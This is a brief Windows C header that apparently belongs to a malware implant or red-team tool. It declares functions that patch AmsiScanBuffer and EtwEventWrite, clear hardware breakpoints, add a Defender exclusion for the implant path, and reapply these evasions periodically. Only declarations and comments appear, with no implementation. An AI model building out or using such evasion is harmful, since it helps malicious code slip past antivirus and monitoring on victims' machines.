#pragma once
#include <windows.h>

// AMSI bypass – patch AmsiScanBuffer
BOOL PatchAMSI();

// ETW bypass – patch EtwEventWrite
BOOL PatchETW();

// Clear hardware breakpoints on all threads
BOOL ClearHardwareBreakpoints();

// Add Defender exclusion for implant path (if elevated)
BOOL AddDefenderExclusion(const wchar_t* exePath);

// Check if running elevated
BOOL IsElevated();

// Re-apply all evasion techniques (called periodically)
VOID ReapplyEvasion();